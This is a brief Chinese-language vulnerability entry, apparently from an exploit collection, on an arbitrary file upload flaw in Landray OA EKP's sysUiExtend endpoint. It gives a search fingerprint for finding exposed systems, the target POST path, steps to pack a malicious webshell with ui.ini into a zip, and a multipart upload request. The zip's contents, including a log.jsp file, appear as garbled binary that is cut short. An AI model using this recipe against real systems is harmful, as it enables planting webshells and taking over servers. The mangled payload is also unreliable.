# 蓝凌OAEKPsysUiExtend存在任意文件上传漏洞

- **系统**：蓝凌　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="Landray 蓝凌OA"`
- **请求**：`POST /api///sys/ui/sys_ui_extend/sysUiExtend.do?method=getThemeInfo HTTP/1.1`

**请求体 / payload**
```
1. 构造zip文件

压缩文件由恶意webshell文件和ui.ini组成，id为上传后文件路径的组成部分\
\[output\_base64Datazip.zip]\(公众号：渗透安全HackTwo
2. 上传文件
Host:
Content-Type: multipart/form-data; boundary=---------------------------174473422425067290282326981440
Content-Length: 682
Cookie: JSESSIONID=3481D31EA6897DA23B87A25B2E549F09
-----------------------------174473422425067290282326981440
Content-Disposition: form-data; name="file"; filename="output_base64Datazip.zip"
Content-Type: application/zip
PK����W²¢g~_���g������log.jspÈ10Fá«° Å,euì\Á	,úYI\èð÷õm7çR5¹¥c\Qp4ìÂù¥ ¥NâÏðboño¨ømXý¶u7ø?¸ºöyPK�…（脚本共 997 字，完整版见原文）
```

**其他**
- 蓝凌OA EKP sysUiExtend存在任意文件上传漏洞: * 一、漏洞简介
* 二、漏洞简介
* 三、资产测绘
* 四、漏洞复现
***